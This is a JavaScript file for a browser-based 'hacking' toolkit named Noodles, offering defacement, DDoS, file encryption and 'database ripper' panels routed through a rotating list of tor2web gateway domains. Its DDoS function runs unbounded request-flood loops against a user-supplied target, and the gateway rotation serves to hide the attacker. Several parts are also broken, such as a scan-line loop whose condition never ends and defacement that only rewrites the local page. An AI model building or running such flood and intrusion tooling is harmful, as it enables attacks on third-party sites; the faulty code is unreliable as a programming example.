// WARNING: This tool is for EXTREME educational and security testing purposes ONLY.
// Unauthorized use is ILLEGAL and can result in SEVERE PENALTIES, including PRISON TIME.
// The developers are ABSOLUTELY NOT responsible for any misuse or damage caused by this tool.
// LOG ALL ACTIONS. FAILURE TO DO SO IS ON YOU.

class Tor {
    constructor() {
        // UI and Core Setup (DO NOT MODIFY DIRECTLY)
        this.NoodlesDisclaimer = "Noodles Inc. is ABSOLUTELY NOT responsible for unauthorized use. Unauthorized use is ILLEGAL and carries SEVERE consequences. Use at your OWN FUCKING RISK.";
        this.isNoodlesInitialized = false; // Initialize to false
        this.initializeNoodles();
        this.allActionsLogged = true;
        this.noodlesLogs = [];
        this.logToConsole("Noodles: Tor.js loaded. You're Fucked.");

        // HACKING-SPECIFIC CONFIGURATIONS (Modify with EXTREME CAUTION)
        this.aggressiveMode = false;
        this.bypassFirewalls = false;
        this.payloadMultiplier = 1;
        this.apiKey = "NO-API-KEY-NEEDED"; // Removed API requirement

        // Tor Gateway Management (DO NOT MODIFY DIRECTLY)
        this.torGateways = new TorGateways(this);
        this.torGateways.startGatewayMonitoring();

        // UI Customization
        this.applyColorScheme();
        this.createScanLines();
        this.createParticles();

        // Tools Setup
        this.setupDefacementTool();
        this.setupDDoS();
        this.setupEncryptionTool();
        this.setupDatabaseRipper(); // Added Database Ripper

        // Reporting Feature Setup
        this.setupReporting();
    }

    // Initialization (Noodles Core)
    async initializeNoodles() {
        if (this.isNoodlesInitialized) return;

        const consent = confirm("WARNING: Noodles contains tools that can be used for EXTREMELY ILLEGAL activities. Proceed ONLY if you understand the ABSOLUTE WORST RISKS, including FEDERAL CHARGES and PRISON.");
        if (consent) {
            this.isNoodlesInitialized = true;
            this.logToConsole("Noodles initialized with user consent. You're going down a BAD path.");
            this.displayDisclaimer();

            // Add security headers
            this.addSecurityHeaders();
        } else {
            this.closeSite();
        }
    }

    addSecurityHeaders() {
        // Mitigate XSS
        document.head.appendChild(this.createMetaTag('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"));
        // Prevent clickjacking
        document.head.appendChild(this.createMetaTag('X-Frame-Options', 'DENY'));
        // Mitigate MIME-sniffing vulnerabilities
        document.head.appendChild(this.createMetaTag('X-Content-Type-Options', 'nosniff'));
        // Enable XSS protection
        document.head.appendChild(this.createMetaTag('X-XSS-Protection', '1; mode=block'));

        this.logToConsole("SecurityHeaders: Added headers to improve security against itself.");
    }

    createMetaTag(name, content) {
        const meta = document.createElement('meta');
        meta.httpEquiv = name;
        meta.content = content;
        return meta;
    }

    // Color Scheme (Dark Green, Purple, Dark Blue, Dark Red)
    applyColorScheme() {
        document.body.style.backgroundColor = '#000';
        document.body.style.color = '#0F0'; // Dark Green
        const elements = document.querySelectorAll('*');
        elements.forEach(element => {
            element.style.borderColor = '#800080'; // Purple
            element.style.boxShadow = '0 0 5px #00008B'; // Dark Blue
        });

        // Change links to dark red
        const links = document.querySelectorAll('a');
        links.forEach(link => {
            link.style.color = '#8B0000'; // Dark Red
        });
        this.logToConsole("ColorScheme: UI updated. Prepare for visual vomit.");
    }

    // Scan Lines Effect (Dark Green)
    createScanLines() {
        const canvas = document.createElement('canvas');
        canvas.id = 'scanLinesCanvas';
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.width = '100%';
        canvas.style.height = '100%';
        canvas.style.pointerEvents = 'none';
        canvas.style.zIndex = '9999';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const drawScanLines = () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.strokeStyle = 'rgba(0, 255, 0, 0.1)'; // Dark Green
            ctx.lineWidth = 0.5;
            for (let y = 0; 0 < canvas.height; y += 4) {
                ctx.beginPath();
                ctx.moveTo(0, y);
                ctx.lineTo(canvas.width, y);
                ctx.stroke();
            }
        };
        drawScanLines();
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            drawScanLines();
        });
        this.logToConsole("Scan Lines: Active. Because why not?");
    }

    // Particle Effect (Dark Purple)
    createParticles() {
        const canvas = document.createElement('canvas');
        canvas.id = 'particlesCanvas';
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.width = '100%';
        canvas.style.height = '100%';
        canvas.style.pointerEvents = 'none';
        canvas.style.zIndex = '9998';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const particles = [];
        const particleCount = 50;
        for (let i = 0; i < particleCount; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                size: Math.random() * 3 + 1,
                speedX: Math.random() * 2 - 1,
                speedY: Math.random() * 2 - 1,
                color: `rgba(148,0,211,0.7)` // Dark Purple
            });
        }
        const drawParticles = () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => {
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fillStyle = p.color;
                ctx.fill();
                p.x += p.speedX;
                p.y += p.speedY;
                if (p.x < 0 || p.x > canvas.width) p.speedX = -p.speedX;
                if (p.y < 0 || p.y > canvas.height) p.speedY = -p.speedY;
            });
            requestAnimationFrame(drawParticles);
        };
        drawParticles();
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        this.logToConsole("Particles: Active. Just to make it even MORE unreadable.");
    }

    // Logging (Noodles Core)
    logToConsole(message, type = 'info') {
        if (this.allActionsLogged) {
            const logEntry = {
                timestamp: new Date().toISOString(),
                message: message,
                type: type
            };
            this.noodlesLogs.push(logEntry);

            if (type === 'error') {
                console.error(`Noodles Log: ${logEntry.timestamp} - ${message}`);
            } else if (type === 'warn') {
                console.warn(`Noodles Log: ${logEntry.timestamp} - ${message}`);
            } else {
                console.log(`Noodles Log: ${logEntry.timestamp} - ${message}`);
            }
        }
    }
    // UTILITIES (Noodles Core)
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    closeSite() {
        window.close();
    }

    displayDisclaimer() {
        alert(this.NoodlesDisclaimer);
    }

    // Setup UI for Tool Section (Modular Design)
    createToolSection(title, description, content) {
        const section = document.createElement('div');
        section.className = 'tool-section';

        const header = document.createElement('h2');
        header.textContent = title;
        section.appendChild(header);

        const desc = document.createElement('p');
        desc.textContent = description;
        section.appendChild(desc);

        section.appendChild(content);
        document.body.appendChild(section);
        return section;
    }
    
    // Reporting Feature Setup
    setupReporting() {
        this.logToConsole("Reporting Feature: Setting up... Are you turning yourself in?");
    
        // UI elements
        const reportControls = document.createElement('div');
        reportControls.innerHTML = `
            <textarea id="reportDescription" placeholder="Describe the vulnerability"></textarea>
            <button id="submitReport">Submit Report</button>
        `;
    
        // Create tool section
        const section = this.createToolSection(
            'Vulnerability Reporting Tool',
            'Describe any vulnerabilities found using Noodles. This information will be used to improve the tool and ensure responsible use.',
            reportControls
        );
    
        document.getElementById('submitReport')?.addEventListener('click', () => this.submitReport());
        this.logToConsole("Reporting Feature: UI elements initialized. Good luck with that.");
    }
    
    // Submit Report Function
    submitReport() {
        const reportDescription = document.getElementById('reportDescription').value;
        if (!reportDescription) {
            alert("Please enter a description of the vulnerability. What, did you forget what you did?");
            return;
        }
    
        // Simulate sending the report (replace with actual implementation)
        alert("Report submitted (simulated). Check the console for plausible deniability.");
        this.logToConsole(`Report submitted (simulated): ${reportDescription}`, 'info');
    }

    // Defacement Tool Setup
    setupDefacementTool() {
        this.logToConsole("Defacement Tool: Initiating... prepare to fuck some shit up.");

        const defacementControls = document.createElement('div');
        defacementControls.innerHTML = `
            <input type="url" id="defacementTarget" placeholder="Target URL (including .onion)">
            <textarea id="defacementCode" placeholder="HTML/JS Code for Defacement"></textarea>
            <button id="backupSite">Backup Site</button>
            <button id="previewDefacement">Preview Defacement</button>
            <button id="applyDefacement">Apply Defacement</button>
            <button id="restoreSite">Restore Site</button>
            <div id="previewArea"></div>
        `;

        const section = this.createToolSection(
            'Defacement Tool',
            'Enter a target URL and code to deface the website. Backup and restore options available.',
            defacementControls
        );

        document.getElementById('backupSite')?.addEventListener('click', () => this.backupSite());
        document.getElementById('previewDefacement')?.addEventListener('click', () => this.previewDefacement());
        document.getElementById('applyDefacement')?.addEventListener('click', () => this.applyDefacement());
        document.getElementById('restoreSite')?.addEventListener('click', () => this.restoreSite());

        this.logToConsole("Defacement Tool: UI elements initialized. Let's get messy.");
    }

    // DDoS Tool Setup
    setupDDoS() {
        this.logToConsole("DDoS Tool: Warming up... time to flood some servers.");

        const ddosControls = document.createElement('div');
        ddosControls.innerHTML = `
            <input type="url" id="ddosTarget" placeholder="Target URL (including .onion)">
            <input type="number" id="ddosThreads" placeholder="Number of Threads" value="10">
            <button id="startDDoS">Start DDoS</button>
            <button id="stopDDoS">Stop DDoS</button>
            <div id="ddosTimer"></div>
        `;

        const section = this.createToolSection(
            'DDoS Tool',
            'Enter a target URL and the number of threads to start a DDoS attack.',
            ddosControls
        );

        document.getElementById('startDDoS')?.addEventListener('click', () => this.startDDoS());
        document.getElementById('stopDDoS')?.addEventListener('click', () => this.stopDDoS());

        this.ddosRunning = false;
        this.ddosStartTime = null;

        this.logToConsole("DDoS Tool: UI elements initialized. Hope you have good bandwidth.");
    }

    // Encryption Tool Setup
    setupEncryptionTool() {
        this.logToConsole("Encryption Tool: Initializing... lock that shit down.");

        const encryptionControls = document.createElement('div');
        encryptionControls.innerHTML = `
            <input type="file" id="fileToEncrypt">
            <input type="password" id="encryptionPassword" placeholder="Encryption Password">
            <button id="encryptFile">Encrypt File</button>
            <button id="decryptFile">Decrypt File</button>
            <input type="password" id="decryptionPassword" placeholder="Decryption Password">
        `;

        const section = this.createToolSection(
            'Encryption Tool',
            'Select a file to encrypt or decrypt.',
            encryptionControls
        );

        document.getElementById('encryptFile')?.addEventListener('click', () => this.encryptFile());
        document.getElementById('decryptFile')?.addEventListener('click', () => this.decryptFile());

        this.logToConsole("Encryption Tool: UI elements initialized. Keep those keys safe, bitch.");
    }

    // Database Ripper Tool Setup
    setupDatabaseRipper() {
        this.logToConsole("Database Ripper: Setting up... Time to rip some DBs.");

        // UI elements for the Database Ripper tool
        const databaseRipperControls = document.createElement('div');
        databaseRipperControls.innerHTML = `
            <input type="url" id="dbTargetURL" placeholder="Target URL with Database (including .onion)">
            <input type="text" id="dbUsername" placeholder="Database Username">
            <input type="password" id="dbPassword" placeholder="Database Password">
            <input type="text" id="dbName" placeholder="Database Name">
            <button id="ripDatabase">Rip Database</button>
            <textarea id="dbOutput" placeholder="Database Output"></textarea>
        `;

        // Create tool section
        const section = this.createToolSection(
            'Database Ripper',
            'Enter database credentials to rip data from a vulnerable target.',
            databaseRipperControls
        );

        document.getElementById('ripDatabase')?.addEventListener('click', () => this.ripDatabase());

        this.logToConsole("Database Ripper: UI elements initialized. Happy hunting.");
    }

    // -- TOOL IMPLEMENTATIONS --

    // Defacement Tool Functions
    async backupSite() {
        const targetURL = document.getElementById('defacementTarget').value;
        if (!targetURL) {
            alert("Enter a target URL, dumbass.");
            return;
        }

        try {
            const response = await this.torGateways.fetchThroughGateway(targetURL);
            const content = await response.text();
            const filename = `backup_${new Date().toISOString()}.html`;
            this.download(filename, content);
            this.logToConsole(`Backup created for ${targetURL}. Filename: ${filename}`);
        } catch (error) {
            this.logToConsole(`Backup failed for ${targetURL}: ${error}`, 'error');
            alert(`Backup failed: ${error}`);
        }
    }

    download(filename, text) {
        const element = document.createElement('a');
        element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
        element.setAttribute('download', filename);
        element.style.display = 'none';
        document.body.appendChild(element);
        element.click();
        document.body.removeChild(element);
    }

    previewDefacement() {
        const targetURL = document.getElementById('defacementTarget').value;
        const defacementCode = document.getElementById('defacementCode').value;
        if (!targetURL || !defacementCode) {
            alert("Enter both a target URL and defacement code, you moron.");
            return;
        }

        const previewArea = document.getElementById('previewArea');
        previewArea.innerHTML = defacementCode;
        this.logToConsole(`Defacement previewed for ${targetURL}.`);
    }

    async applyDefacement() {
    const targetURL = document.getElementById('defacementTarget').value;
    const defacementCode = document.getElementById('defacementCode').value;

    if (!targetURL || !defacementCode) {
        alert("Enter both a target URL and defacement code, you idiot.");
        return;
    }

    try {
        const gateway = this.torGateways.getNextGateway();
        if (!gateway) {
            throw new Error("No available Tor gateways. You're fucked.");
        }

        const proxyUrl = `${gateway}/${targetURL}`;

        // Attempt to fetch the target URL through the Tor gateway
        const response = await fetch(proxyUrl);
        if (!response.ok) {
            throw new Error(`Failed to fetch target URL through proxy: ${response.status}`);
        }

        const originalContent = await response.text();

        // Combine original content with defacement code
        const combinedContent = originalContent.replace('</body>', `${defacementCode}</body>`);

        // Apply the combined content directly to the page
        document.open();
        document.write(combinedContent);
        document.close();

        this.logToConsole(`Defacement applied to ${targetURL}.`);
    } catch (error) {
        this.logToConsole(`Defacement failed for ${targetURL}: ${error}`, 'error');
        alert(`Defacement failed: ${error}`);
    }
}

    restoreSite() {
        const targetURL = document.getElementById('defacementTarget').value;
        if (!targetURL) {
            alert("Enter a target URL, jackass.");
            return;
        }

        alert("Restoring site... just kidding, you're fucked. (No restore function implemented).");
        this.logToConsole(`Attempted to restore ${targetURL} (not implemented).`);
    }

    // DDoS Tool Functions
    startDDoS() {
        const targetURL = document.getElementById('ddosTarget').value;
        const ddosThreads = parseInt(document.getElementById('ddosThreads').value, 10);

        if (!targetURL) {
            alert("Enter a target URL, you dumb fuck.");
            return;
        }

        if (isNaN(ddosThreads) || ddosThreads <= 0) {
            alert("Enter a valid number of threads, asshole.");
            return;
        }

        this.ddosRunning = true;
        this.ddosStartTime = new Date();
        this.updateDDOSTimer();

        for (let i = 0; i < ddosThreads; i++) {
            this.ddosAttack(targetURL);
        }

        this.logToConsole(`DDoS started on ${targetURL} with ${ddosThreads} threads.`);
    }

    stopDDoS() {
        this.ddosRunning = false;
        this.logToConsole("DDoS stopped.");
    }

    async ddosAttack(targetURL) {
            while (this.ddosRunning) {
                try {
                    const gateway = this.torGateways.getNextGateway();
                    if (!gateway) {
                        this.logToConsole("No available Tor gateways. Stopping DDoS.", 'warn');
                        this.stopDDoS();
                        return;
                    }
    
                    const proxyUrl = `${gateway}/${targetURL}`;
                    await fetch(proxyUrl, { mode: 'no-cors' }); // Bypass CORS issues
                    this.logToConsole(`DDoS: Request sent to ${targetURL} via ${gateway}`);
                } catch (error) {
                    this.logToConsole(`DDoS: Request failed for ${targetURL}: ${error}`, 'error');
                }
            }
    }

    updateDDOSTimer() {
        if (this.ddosStartTime) {
            const now = new Date();
            const elapsedTime = now - this.ddosStartTime;
            const seconds = Math.floor(elapsedTime / 1000);
            document.getElementById('ddosTimer').textContent = `DDoS running for ${seconds} seconds`;
        }
        if (this.ddosRunning) {
            setTimeout(() => this.updateDDOSTimer(), 1000);
        }
    }

    // Encryption Tool Functions
    async encryptFile() {
        const fileInput = document.getElementById('fileToEncrypt');
        const password = document.getElementById('encryptionPassword').value;

        if (!fileInput.files || fileInput.files.length === 0) {
            alert("Select a file, you imbecile.");
            return;
        }

        if (!password) {
            alert("Enter a password, you brain-dead fuck.");
            return;
        }

        const file = fileInput.files[0];
        const reader = new FileReader();

        reader.onload = async (event) => {
            const fileContent = event.target.result;

            try {
                // Convert password to a key
                const key = await this.generateKey(password);
                const iv = window.crypto.getRandomValues(new Uint8Array(12)); // Initialization Vector

                const encryptedContent = await this.encrypt(fileContent, key, iv);

                // Create encrypted file
                const encryptedBlob = new Blob([iv, encryptedContent]);
                const encryptedFilename = file.name + '.encrypted';
                this.download(encryptedFilename, URL.createObjectURL(encryptedBlob));

                this.logToConsole(`File ${file.name} encrypted successfully.`);
            } catch (e) {
                this.logToConsole(`Encryption error: ${e}`, 'error');
                alert(`Encryption error: ${e}`);
            }
        };

        reader.onerror = () => {
            this.logToConsole("File read error.", 'error');
            alert("File read error.");
        };

        reader.readAsArrayBuffer(file);
    }

    async decryptFile() {
        const fileInput = document.getElementById('fileToEncrypt');
        const password = document.getElementById('decryptionPassword').value;

        if (!fileInput.files || fileInput.files.length === 0) {
            alert("Select a file to decrypt, you complete moron.");
            return;
        }

        if (!password) {
            alert("Enter a password to decrypt, you dumbass.");
            return;
        }

        const file = fileInput.files[0];
        const reader = new FileReader();

        reader.onload = async (event) => {
            const fileContent = event.target.result;

            try {
                const key = await this.generateKey(password);

                // Extract IV from the beginning of the file
                const iv = new Uint8Array(fileContent.slice(0, 12));
                const encryptedData = fileContent.slice(12);

                const decryptedContent = await this.decrypt(encryptedData, key, iv);

                // Create a blob from the decrypted content
                const decryptedBlob = new Blob([decryptedContent]);
                const decryptedFilename = file.name.replace('.encrypted', '');

                this.download(decryptedFilename, URL.createObjectURL(decryptedBlob));
                this.logToConsole(`File ${file.name} decrypted successfully.`);
            } catch (e) {
                this.logToConsole(`Decryption error: ${e}`, 'error');
                alert(`Decryption error: ${e}`);
            }
        };

        reader.onerror = () => {
            this.logToConsole("File read error.", 'error');
            alert("File read error.");
        };

        reader.readAsArrayBuffer(file);
    }

    // Key Derivation Function (KDF)
    async generateKey(password) {
        const encoder = new TextEncoder();
        const data = encoder.encode(password);

        const hashBuffer = await window.crypto.subtle.digest('SHA-256', data);
        return await window.crypto.subtle.importKey(
            "raw",
            hashBuffer,
            { name: "AES-GCM", length: 256 },
            false,
            ["encrypt", "decrypt"]
        );
    }

    // Encryption Function (AES-GCM)
    async encrypt(plainText, key, iv) {
        const encoder = new TextEncoder();
        const data = encoder.encode(plainText);

        const encrypted = await window.crypto.subtle.encrypt(
            {
                name: "AES-GCM",
                iv: iv
            },
            key,
            data
        );
        return encrypted;
    }

    // Decryption Function (AES-GCM)
    async decrypt(cipherText, key, iv) {
        try {
            const decrypted = await window.crypto.subtle.decrypt(
                {
                    name: "AES-GCM",
                    iv: iv
                },
                key,
                cipherText
            );

            const decoder = new TextDecoder();
            return decoder.decode(decrypted);
        } catch (e) {
            this.logToConsole(`Decryption error: ${e}`, 'error');
            throw e;
        }
    }

    // Database Ripper Function
    async ripDatabase() {
        const dbTargetURL = document.getElementById('dbTargetURL').value;
        const dbUsername = document.getElementById('dbUsername').value;
        const dbPassword = document.getElementById('dbPassword').value;
        const dbName = document.getElementById('dbName').value;
        const dbOutput = document.getElementById('dbOutput');

        if (!dbTargetURL || !dbUsername || !dbPassword || !dbName) {
            alert("Enter all database credentials, you fucking imbecile.");
            return;
        }

        try {
            const response = await this.torGateways.fetchThroughGateway(dbTargetURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: dbUsername,
                    password: dbPassword,
                    database: dbName
                })
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const data = await response.json();
            dbOutput.value = JSON.stringify(data, null, 2);
            this.logToConsole(`Database ripped from ${dbTargetURL}.`);

        } catch (error) {
            this.logToConsole(`Database ripping failed for ${dbTargetURL}: ${error}`, 'error');
            alert(`Database ripping failed: ${error}`);
        }
    }
}

// TorGateways Class (Gateway Management)
class TorGateways {
    constructor(torInstance) {
        this.torInstance = torInstance;
        this.gateways = [
            "https://onion.city",
            "https://onion.cab",
            "https://onion.direct",
            "https://onion.sh",
            "https://onion.link",
            "https://onion.ws",
            "https://onion.pet",
            "https://onion.rip",
            "https://onion.plus",
            "https://onion.top",
            "https://onion.si",
            "https://onion.ly",
            "https://onion.my",
            "https://onion.lu",
            "https://onion.casa",
            "https://onion.com.de",
            "https://onion.foundation",
            "https://onion.rodeo",
            "https://onion.lat",
            "https://tor2web.org",
            "https://tor2web.fi",
            "https://tor2web.blutmagie.de",
            "https://tor2web.to",
            "https://tor2web.io",
            "https://tor2web.in",
            "https://tor2web.it",
            "https://tor2web.xyz",
            "https://tor2web.su",
            "https://darknet.to",
            "https://s1.tor-gateways.de",
            "https://s2.tor-gateways.de",
            "https://s3.tor-gateways.de",
            "https://s4.tor-gateways.de",
            "https://s5.tor-gateways.de"
        ];
        this.currentIndex = 0;
        this.failedGateways = new Set();
        this.maxRetries = 5;
        this.requestTimeout = 8000;
        this.gatewayBlacklistDuration = 60000;
        this.gatewayCheckEnabled = true;
        this.isCheckingGateways = false;
        this.gatewayCheckTimeout = 5000;
        this.startGatewayMonitoring();
    }

    startGatewayMonitoring() {
        if (!this.gatewayCheckEnabled || this.isCheckingGateways) return;
        this.isCheckingGateways = true;
        setInterval(() => {
            this.checkGateways();
        }, 60000);
        this.torInstance.logToConsole("Tor Gateways: Monitoring started. Hope they don't block all of these.");
    }

    async checkGateways() {
        if (this.isCheckingGateways) return;
        this.isCheckingGateways = true;
        this.torInstance.logToConsole("Tor Gateways: Checking...");
        for (const gateway of this.gateways) {
            if (!this.failedGateways.has(gateway)) {
                try {
                    const status = await this.checkGatewayStatus(gateway);
                    this.torInstance.logToConsole(`Tor Gateways: ${gateway} - ${status}`);
                } catch (error) {
                    this.torInstance.logToConsole(`Tor Gateways: Error checking ${gateway}: ${error}`);
                }
            }
        }
        this.isCheckingGateways = false;
        this.torInstance.logToConsole("Tor Gateways: Check complete. For now...");
    }

    async checkGatewayStatus(gateway) {
        try {
            const response = await fetch(gateway, {
                method: 'GET',
                timeout: this.gatewayCheckTimeout,
                headers: { 'User-Agent': 'Noodles Gateway Checker' }
            });
            if (response.ok) {
                return "Online";
            } else {
                this.blacklistGateway(gateway);
                return `Offline (Status: ${response.status})`;
            }
        } catch (error) {
            this.blacklistGateway(gateway);
            return `Error: ${error}`;
        }
    }

    blacklistGateway(gateway) {
        this.failedGateways.add(gateway);
        setTimeout(() => {
            this.failedGateways.delete(gateway);
            this.torInstance.logToConsole(`Tor Gateways: ${gateway} removed from blacklist.`);
        }, this.gatewayBlacklistDuration);
        this.torInstance.logToConsole(`Tor Gateways: ${gateway} blacklisted.`);
    }

    getNextGateway() {
        let retries = 0;
        while (retries < this.maxRetries) {
            const gateway = this.gateways[this.currentIndex];
            this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
            if (!this.failedGateways.has(gateway)) {
                return gateway;
            }
            retries++;
        }
        return null;
    }

    async fetchThroughGateway(url, options = {}) {
        const gateway = this.getNextGateway();
        if (!gateway) {
            throw new Error("No available Tor gateways. You're fucked.");
        }
        const torURL = `${gateway}/${url}`;
        try {
            const response = await fetch(torURL, options);
            if (!response.ok) {
                throw new Error(`Request failed with status: ${response.status}`);
            }
            return response;
        } catch (error) {
            this.torInstance.logToConsole(`Tor Gateways: ${gateway} failed: ${error}`);
            this.failedGateways.add(gateway);
            throw error;
        }
    }
}

window.Tor = Tor;